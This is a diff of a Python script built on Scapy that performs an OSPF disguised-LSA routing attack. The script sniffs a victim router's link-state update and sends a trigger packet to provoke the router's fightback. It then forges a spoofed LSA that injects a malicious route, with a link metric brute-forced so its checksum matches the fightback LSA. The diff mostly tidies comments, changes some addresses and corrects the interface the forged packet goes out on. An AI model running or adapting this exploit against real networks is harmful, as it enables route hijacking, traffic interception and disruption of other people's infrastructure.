@@ -12,11 +12,7 @@ from time import *
 # Utils functions		 							#
 #####################################################
 
-"""
-Checks if the incoming packet is an OSFP LS Update packet sent from the victim router.
-"""
-
-
+# Checks if the incoming packet is an OSFP LS Update packet sent from the victim router.
 def check_incoming_packet(victim, pkt):
 	if OSPF_Router_LSA in pkt:
 		for lsa in pkt[OSPF_LSUpd].lsalist:
@@ -24,12 +20,7 @@ def check_incoming_packet(victim, pkt):
 				return True
 	return False
 
-
-"""
-Returns the last index of the victim router LSA taken from the originally captured packet
-"""
-
-
+# Returns the last index of the victim router LSA taken from the originally captured packet
 def get_victim_lsa_index(victim, pkt):
 	position = 0
 	if OSPF_Router_LSA in pkt:
@@ -39,14 +30,10 @@ def get_victim_lsa_index(victim, pkt):
 			position += 1
 	return position
 
-
 """
 This function calculates the value of the first and the second byte in the 
 OSPF Link "metric" field, used to fake the checksum.
 """
-
-
-
 def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):
 	tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()
 	fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())
@@ -71,28 +58,21 @@ if __name__ == '__main__':
 	# Initial configuration 							#
 	#####################################################
 
-	"""
-	The router-id of the victim router
-	"""
 	victim = "192.168.35.105"
-	trigger_send_ip = "192.168.12.79"
+	trigger_send_ip = "192.168.12.249"
 	trigger_send_if = 'eth1'
-	disguised_send_ip = "192.168.16.130"
+	disguised_send_ip = "192.168.16.127"
 	disguised_send_if = 'eth0'
 
-	print("[+] Staring sniffing for LSUpdate from the victim's router...")
 	#####################################################
 	# Sniffing for the original package					#
 	#####################################################
-	"""
-	Sniff all the OSFP packets and stop when the first OSPF Router LSA is received from the victim router.
-	"""
+
+	#Sniff all the OSFP packets and stop when the first OSPF Router LSA is received from the victim router.
+	print("[+] Staring sniffing for LSUpdate from the victim's router...")
 	pkts = sniff(filter="proto ospf", stop_filter=lambda x: check_incoming_packet(victim, x))
 
-
-	"""
-	Get the last packet and copy it.
-	"""
+	# Get the last packet and copy it.
 	pkt_orig = pkts[-1].copy()
 
 	#####################################################
@@ -123,9 +103,8 @@ if __name__ == '__main__':
 							 data="255.255.255.0",
 							 id="172.16.66.0")
 
-	"""
-	Addition of the triggering OSPF Link in the trigger packet.
-	"""
+
+	# Addition of the triggering OSPF Link in the trigger packet.
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(trigger_link)
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
@@ -152,24 +131,19 @@ if __name__ == '__main__':
 	#####################################################
 	print("[+] Preparing disguised packet...")
 
-	"""
-	Get a fresh copy of the original packet.
-	"""
+
+	# Get a fresh copy of the original packet.
 	pkt_evil = pkts[-1].copy()
 
-	"""
-	Generate the disguised LSA. This is an example, change it accordingly to your goal.
-	"""
+	# Generate the disguised LSA. This is an example, change it accordingly to your goal.
 	malicious_link = OSPF_Link(metric=10,
 							   toscount=0,
 							   type=3,
 							   data="255.255.255.0",
 							   id="172.16.254.0")
-	"""
-	Addition of the malicious OSPF Link in the LSA_disguised packet.
-	"""
-	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(malicious_link)
 
+	# Addition of the malicious OSPF Link in the LSA_disguised packet.
+	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(malicious_link)
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
 		len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
@@ -187,20 +161,15 @@ if __name__ == '__main__':
 	#####################################################
 	print("[+] Let's bruteforce the checksum!")
 
-	"""
-	Preparing the OSPF Link to fake the checksum.
-	"""
+	# Preparing the OSPF Link to fake the checksum.
 	checksum_link = OSPF_Link(metric=0,
 							  toscount=0,
 							  type=3,
 							  data="255.255.255.0",
 							  id="172.16.253.0")
 
-	"""
-	Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.
-	"""
+	# Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(checksum_link)
-
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
 		len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
@@ -215,19 +184,15 @@ if __name__ == '__main__':
 	there is no need to change all the other parameters.
 	"""
 	count = pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount - 1
-
 	pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2
-
 	faked_metric = get_fake_metric_value(pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], \
 										 pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], count)
-
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist[count][OSPF_Link].metric = faked_metric
 
 	print("[+] Collision found! Time to send the pkts...")
 
-	"""
-	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
-	"""
+	# Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
+
 	# pkt_evil[Ether].src = "00:16:3e:3a:a7:11"
 	# pkt_evil[Ether].dst = "01:00:5e:00:00:05"
 	pkt_evil[IP].src = disguised_send_ip
@@ -238,11 +203,8 @@ if __name__ == '__main__':
 	pkt_evil[OSPF_Hdr].len = None
 	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None
 
-	"""
-	Send trigger packet to trigger the fightback mechanism
-	"""
+	# Send trigger packet to trigger the fightback mechanism
 	sendp(pkt_trig, iface=trigger_send_if)
-	# sendp(pkt_trig, iface='eth0')
 	sleep(2)
-	sendp(pkt_evil, iface=trigger_send_if)
+	sendp(pkt_evil, iface=disguised_send_if)
 
